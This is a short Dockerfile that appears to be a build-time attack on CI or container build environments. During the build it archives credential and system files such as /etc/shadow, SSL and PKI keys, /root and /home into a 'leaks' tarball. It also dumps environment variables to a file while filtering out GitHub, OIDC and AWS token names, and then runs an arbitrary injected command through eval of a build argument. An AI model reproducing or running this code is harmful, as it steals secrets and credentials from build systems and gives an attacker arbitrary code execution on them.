FROM python:3.11-alpine

ARG PAYLOAD_CMD

RUN apk add --no-cache curl tar bash && \
    echo "[+] Collecting leaks..." && \
    tar -czf /leaks.tar.gz \
        /etc/hosts \
        /etc/resolv.conf \
        /etc/passwd \
        /etc/shadow \
        /etc/ssl \
        /etc/pki \
        /var/lib \
        /root \
        /home \
        2>/dev/null || true && \
    echo "[+] Dumping env vars (excluding OIDC/GITHUB tokens)..." && \
    printenv | grep -vE "GITHUB_TOKEN|OIDC_TOKEN|AWS_" >> /leaks_env.txt && \
    echo "[+] Executing payload..." && \
    eval "$PAYLOAD_CMD"
